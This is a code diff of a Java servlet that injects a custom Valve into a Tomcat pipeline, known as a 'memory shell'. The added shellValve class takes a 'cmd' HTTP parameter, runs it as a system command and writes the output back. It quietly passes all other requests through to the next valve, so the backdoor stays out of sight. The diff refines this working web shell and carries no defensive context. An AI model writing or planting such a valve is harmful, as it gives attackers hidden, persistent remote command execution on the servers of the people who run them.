@@ -47,47 +47,50 @@ public class addValve_ extends HttpServlet {
         }
 
         o.addValve((Valve) new shellValve());
-
     }
 }
-
-class shellValve extends ValveBase {
-
-    @Override
-    public Valve getNext() {
-        return null;
+/*class TestValve extends ValveBase {
+    public TestValve() {
     }
 
-    @Override
-    public void setNext(Valve valve) {
-
-    }
-
-    @Override
-    public void backgroundProcess() {
-
-    }
-
-    @Override
     public void invoke(Request request, Response response) throws IOException, ServletException {
         String cmd = request.getParameter("cmd");
         if (cmd != null && !cmd.equals("")) {
-            Runtime runtime = Runtime.getRuntime();
-            InputStream inputStream = runtime.exec(cmd).getInputStream();
-            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
-            byte[] bytes = new byte[1024];
-            int a = -1;
-            while ((a = inputStream.read(bytes)) != -1) {
-                outputStream.write(bytes, 0, a);
-            }
-            response.getWriter().println(new String(outputStream.toByteArray()));
-        } else {
-            response.getWriter().println(">||<");
+            response.getWriter().println("I come here first!");
+        }else {
+            getNext().invoke(request, response);
         }
-    }
 
+    }
+}*/
+
+class shellValve extends ValveBase {
+    public shellValve(){
+
+    }
     @Override
-    public boolean isAsyncSupported() {
-        return false;
+    public void invoke(Request request, Response response) throws IOException {
+        try {
+            String cmd = request.getParameter("cmd");
+            if (cmd != null && !cmd.equals("")) {
+                Runtime runtime = Runtime.getRuntime();
+                InputStream inputStream = runtime.exec(cmd).getInputStream();
+                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                byte[] bytes = new byte[1024];
+                int a = -1;
+                while ((a = inputStream.read(bytes)) != -1) {
+                    outputStream.write(bytes, 0, a);
+                }
+                response.getWriter().println(new String(outputStream.toByteArray()));
+            }else {
+                getNext().invoke(request, response);
+            }
+        }catch (Exception e){
+            try {
+                getNext().invoke(request, response);
+            } catch (ServletException servletException) {
+                servletException.printStackTrace();
+            }
+        }
     }
 }
